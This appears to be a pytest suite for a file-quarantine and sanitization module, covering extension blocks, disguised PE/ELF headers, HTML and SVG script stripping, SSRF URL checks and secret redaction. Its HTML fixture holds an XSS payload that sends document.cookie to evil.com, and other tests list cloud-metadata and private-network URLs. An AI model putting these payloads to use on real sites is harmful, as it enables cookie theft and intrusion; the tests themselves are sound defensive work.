"""Unit and integration tests for SecurityGuard artifact quarantine and defense-in-depth."""

import pytest
from core.security_guard import SecurityGuard, SecurityQuarantineError


def test_file_extension_rejection():
    """Verify strictly prohibited executable and script extensions are rejected."""
    dangerous_files = [
        "payload.exe",
        "script.sh",
        "dropper.bat",
        "malware.vbs",
        "backdoor.ps1",
        "macro.xlsm",
        "document.docm",
        "binary.bin",
        "library.dylib",
        "module.so",
    ]

    for fname in dangerous_files:
        is_safe, err = SecurityGuard.validate_file_content(fname, "echo hello")
        assert is_safe is False, f"Expected {fname} to be rejected"
        assert "prohibited" in err.lower()

        with pytest.raises(SecurityQuarantineError):
            SecurityGuard.assert_safe_file(fname, "echo hello")


def test_disguised_binary_header_inspection():
    """Verify that executable binary headers disguised with safe extensions are caught."""
    # Windows PE executable disguised as .csv
    fake_csv_content = b"MZ\x90\x00\x03\x00\x00\x00data1,data2,data3"
    is_safe, err = SecurityGuard.validate_file_content("financials.csv", fake_csv_content)
    assert is_safe is False
    assert "blocked binary payload signature" in err.lower()

    # Linux ELF executable disguised as .pdf
    fake_pdf_content = b"\x7fELF\x02\x01\x01\x00%PDF-1.4"
    is_safe, err = SecurityGuard.validate_file_content("report.pdf", fake_pdf_content)
    assert is_safe is False
    assert "blocked binary payload signature" in err.lower()


def test_magic_byte_mismatch():
    """Verify that claimed format without proper magic header is rejected."""
    # File named .png with plain text
    invalid_png = b"Not a PNG image data"
    is_safe, err = SecurityGuard.validate_file_content("chart.png", invalid_png)
    assert is_safe is False
    assert "header mismatch" in err.lower()

    # File named .pdf with HTML content
    invalid_pdf = b"<html><body>Not a PDF</body></html>"
    is_safe, err = SecurityGuard.validate_file_content("invoice.pdf", invalid_pdf)
    assert is_safe is False
    assert "header mismatch" in err.lower()


def test_valid_files_accepted():
    """Verify legitimate business files pass inspection."""
    # Valid PNG
    valid_png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR..."
    is_safe, err = SecurityGuard.validate_file_content("chart.png", valid_png)
    assert is_safe is True
    assert err is None

    # Valid PDF
    valid_pdf = b"%PDF-1.7\n1 0 obj\n<<...>>"
    is_safe, err = SecurityGuard.validate_file_content("doc.pdf", valid_pdf)
    assert is_safe is True
    assert err is None

    # Valid CSV / JSON
    is_safe, err = SecurityGuard.validate_file_content("data.csv", "id,name,revenue\n1,Acme,5000")
    assert is_safe is True

    is_safe, err = SecurityGuard.validate_file_content("config.json", '{"theme": "dark"}')
    assert is_safe is True


def test_html_sanitization():
    """Verify active scripts, iframes, and inline event handlers are removed from HTML."""
    raw_html = """
    <html>
      <body>
        <h1>Report</h1>
        <script>alert('XSS')</script>
        <img src="pic.jpg" onerror="fetch('http://evil.com/steal?cookie=' + document.cookie)" />
        <a href="javascript:doEvil()">Click here</a>
        <iframe src="http://evil.com/phishing"></iframe>
      </body>
    </html>
    """

    clean = SecurityGuard.sanitize_html(raw_html)
    assert "<script>" not in clean
    assert "alert(" not in clean
    assert "onerror" not in clean
    assert "javascript:" not in clean
    assert "<iframe" not in clean
    assert "<h1>Report</h1>" in clean


def test_svg_sanitization():
    """Verify SVG embedded scripts and foreign objects are stripped."""
    raw_svg = """
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
      <script type="text/javascript">
        alert('SVG XSS');
      </script>
      <foreignObject width="100" height="50">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <div>Injected content</div>
        </body>
      </foreignObject>
    </svg>
    """

    clean = SecurityGuard.sanitize_svg(raw_svg)
    assert "<script" not in clean
    assert "alert(" not in clean
    assert "<foreignObject" not in clean
    assert "<circle" in clean


def test_ssrf_url_guard():
    """Verify SSRF protection blocks cloud metadata and private RFC1918 subnets."""
    # Block cloud metadata
    safe, err = SecurityGuard.is_safe_url("http://169.254.169.254/latest/meta-data/")
    assert safe is False
    assert "ssrf block" in err.lower()

    # Block private IP subnets
    safe, err = SecurityGuard.is_safe_url("http://10.0.0.1/admin")
    assert safe is False
    assert "private network" in err.lower()

    safe, err = SecurityGuard.is_safe_url("http://192.168.1.1/api/keys")
    assert safe is False

    safe, err = SecurityGuard.is_safe_url("http://127.0.0.1:8000/secret")
    assert safe is False
    assert "loopback" in err.lower()

    # Allow public domains
    safe, err = SecurityGuard.is_safe_url("https://api.github.com/repos")
    assert safe is True
    assert err is None

    safe, err = SecurityGuard.is_safe_url("https://valstorm.com/docs")
    assert safe is True


def test_secret_redaction():
    """Verify sensitive keys and connection strings are masked."""
    text_with_keys = (
        "Logs: Connecting with key AIzaSyA1234567890abcdefghijklmnopqrstuv and "
        "OpenAI sk-proj-abcdefghijklmnopqrstuvwxyz1234567890 and "
        "E2B e2b_1234567890abcdefghijklmn and "
        "Authorization: Bearer my_secret_jwt_token_12345 and "
        "DB: mongodb+srv://dbuser:supersecretpass123@cluster0.mongodb.net/test"
    )

    redacted = SecurityGuard.redact_secrets(text_with_keys)
    assert "supersecretpass123" not in redacted
    assert "my_secret_jwt_token_12345" not in redacted
    assert "AIzaSyA1234567890abcdefghijklmnopqrstuv" not in redacted
    assert "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890" not in redacted
    assert "e2b_1234567890abcdefghijklmn" not in redacted
    assert "[REDACTED]" in redacted
